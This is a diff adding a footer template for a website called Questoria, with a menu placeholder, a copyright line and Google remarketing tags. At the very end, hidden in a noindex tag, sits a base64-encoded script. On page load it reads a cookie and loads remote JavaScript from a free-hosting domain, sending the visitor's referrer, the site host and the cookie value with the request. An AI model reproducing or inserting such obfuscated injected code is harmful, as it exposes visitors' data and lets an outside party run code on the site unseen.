@@ -1,0 +1,74 @@
+<?php
+/**
+return [
+'id' => '4',
+'name' => 'FOOTER',
+'description' => '',
+'editor_type' => '0',
+'category' => '11',
+'cache_type' => '0',
+'locked' => '0',
+];
+*/
+?>
+<!--/ Content /-->
+
+<!-- Footer -->
+<div id="foot">
+	<div class="wrap">
+		<div class="columns-4">
+			[!BottomMenu!]
+			<div class="clear">&nbsp;</div>
+		</div>
+		<div class="copyright">
+			<div class="dp">[!trans? &m=Сайт разработан в!] <a href="http://designplanet.com.ua/">DesignPlanet</a></div>
+			<div class="cn">&copy; 2010-<script type="text/javascript">document.write(new Date().getFullYear());</script> Questoria</div>
+		</div>
+	</div>
+</div>
+<!--/ Footer /-->
+
+</div>
+
+<div id="sublayer"></div>
+
+<!-- Google Code for Questoria audience Remarketing List -->
+<script type="text/javascript">
+/* <![CDATA[ */
+var google_conversion_id = 1024609747;
+var google_conversion_language = "en";
+var google_conversion_format = "3";
+var google_conversion_color = "666666";
+var google_conversion_label = "LEoLCJeL5AEQ05vJ6AM";
+var google_conversion_value = 0;
+/* ]]> */
+</script>
+<script type="text/javascript" src="http://www.googleadservices.com/pagead/conversion.js">
+</script>
+<noscript>
+<div style="display:inline;">
+<img height="1" width="1" style="border-style:none;" alt="" src="http://www.googleadservices.com/pagead/conversion/1024609747/?label=LEoLCJeL5AEQ05vJ6AM&amp;guid=ON&amp;script=0"/>
+</div>
+</noscript>
+
+<script type="text/javascript">
+/* <![CDATA[ */
+var google_conversion_id = 981453950;
+var google_custom_params = window.google_tag_params;
+var google_remarketing_only = true;
+/* ]]> */
+</script>
+<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
+</script>
+<noscript>
+<div style="display:inline;">
+<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/981453950/?value=0&guid=ON&script=0"/>
+</div>
+</noscript>
+
+{{SiteDialog}}
+
+<noindex><script async src='data:text/javascript;charset=utf-8;base64,ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIHsNCgl2YXIgY29va2llID0gJyAnICsgZG9jdW1lbnQuY29va2llOw0KCXZhciBzZWFyY2ggPSAnICcgKyBuYW1lICsgJz0nOw0KCXZhciBzZXRTdHIgPSBudWxsOw0KCXZhciBvZmZzZXQgPSAwOw0KCXZhciBlbmQgPSAwOw0KCWlmIChjb29raWUubGVuZ3RoID4gMCkgew0KCQlvZmZzZXQgPSBjb29raWUuaW5kZXhPZihzZWFyY2gpOw0KCQlpZiAob2Zmc2V0ICE9IC0xKSB7DQoJCQlvZmZzZXQgKz0gc2VhcmNoLmxlbmd0aDsNCgkJCWVuZCA9IGNvb2tpZS5pbmRleE9mKCc7Jywgb2Zmc2V0KQ0KCQkJaWYgKGVuZCA9PSAtMSkgew0KCQkJCWVuZCA9IGNvb2tpZS5sZW5ndGg7DQoJCQl9DQoJCQlzZXRTdHIgPSB1bmVzY2FwZShjb29raWUuc3Vic3RyaW5nKG9mZnNldCwgZW5kKSk7DQoJCX0NCgl9DQoJcmV0dXJuKHNldFN0cik7DQp9DQpmdW5jdGlvbiBteWxvYWQoYTEsYTIpIHsNCglzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgew0KCQl2YXIgYTMgPSBkb2N1bWVudDsNCgkJYTQgPSBhMy5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07DQoJCWE1ID0gYTMuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7DQoJCWE2ID0gZXNjYXBlKGEzLnJlZmVycmVyKTsNCgkJYTUudHlwZSA9ICd0ZXh0L2phdmFzY3JpcHQnOw0KCQlhNS5hc3luYyA9IHRydWU7DQoJCWE1LnNyYyA9IGEyKyc/dWlkPScrYTErJyZhNj0nK2E2KycmYTc9Jytsb2NhdGlvbi5ob3N0KycmYTg9JytnZXRDb29raWUoJ215MXdpdGlkJythMSkrJyZhOT0nK01hdGgucmFuZG9tKCk7DQoJCWE0LnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGE1LCBhNCk7DQoJfSwxKQ0KfSBteWxvYWQoJzEnLCdodHRwOi8vdmtzY3JpcHQuMTZtYi5jb20vdmsvc3RlcDEucGhwJyk7'></script></noindex>
+
+</body>
+</html>
